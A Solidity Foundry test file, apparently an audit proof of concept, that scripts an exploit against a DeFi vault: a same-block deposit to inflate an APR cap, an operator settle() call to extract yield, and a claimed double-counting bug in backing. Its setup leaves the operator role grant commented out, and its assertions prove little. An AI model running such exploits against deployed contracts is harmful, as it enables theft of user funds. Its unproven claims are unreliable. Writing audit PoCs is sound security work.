// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/tokens/USDM.sol";

contract AuditAgentPoC is SimulatorBase {
    address attacker = address(0xdead);
    address operator = address(0xfeed);

    function setUp() public {
        setUpSimulator();

        // Ensure operator has the correct role if needed, SimulatorBase usually handles this
        // but we grant operator role just in case
        bytes32 operatorRole = keccak256("OPERATOR_ROLE");
        vm.prank(address(acl)); // or admin
        // acl.grantRole(operatorRole, operator); // SimulatorBase might already have an operator
    }

    function test_exploit() public {
        // ATTACK TIMELINE:
        // 1. [Setup] Deploy contracts, fund accounts
        uint256 initialDeposit = 1_000_000e6;
        uint256 inflationDeposit = 100_000_000e6;
        uint256 proposedYield = 10_000_000e6;

        deal(address(usdc), attacker, initialDeposit + inflationDeposit);

        // 2. [T=0] Attacker performs initial deposit to initialize vault state
        vm.startPrank(attacker);
        usdc.approve(address(vault), initialDeposit + inflationDeposit);
        vault.deposit(initialDeposit);
        vm.stopPrank();

        // Advance time to allow settlement
        vm.warp(block.timestamp + 1 days);

        int256 backingBefore = accountant.totalBackingSigned();
        console.log("Step 2: backingBefore =", int256(backingBefore));

        // 3. [T=1] Attacker mints large amount of USDM in the same block to inflate APR cap
        // and operator calls settle() to extract unbounded yield
        vm.startPrank(attacker);
        vault.deposit(inflationDeposit);
        vm.stopPrank();

        // 4. [T=1 same block] Operator exploits the gap by settling with inflated surplus
        // The double-counting bug in _readL1Backing inflates totalBackingSigned
        // The same-block minting relaxes the APR cap in Gate 4
        int256 backingAfter = accountant.totalBackingSigned();
        console.log("Step 4: backingAfter =", int256(backingAfter));

        uint256 settledYieldBefore = accountant.totalSettledYield();

        vm.prank(operator);
        vault.settle(proposedYield);

        // 5. [Assert] Verify attacker gained X or protocol lost Y
        uint256 settledYieldAfter = accountant.totalSettledYield();
        console.log("Step 5: settledYield extracted =", settledYieldAfter - settledYieldBefore);

        assertGt(
            settledYieldAfter,
            settledYieldBefore,
            "Attacker successfully extracted unbounded yield by bypassing APR cap and backing ratio gates"
        );

        // Also verify that the backing was artificially inflated due to double counting
        // (If the bug is active, backingAfter should be significantly higher than expected)
        assertGt(
            backingAfter,
            backingBefore + int256(inflationDeposit),
            "Double-counting bug inflated totalBackingSigned beyond actual deposit"
        );
    }
}
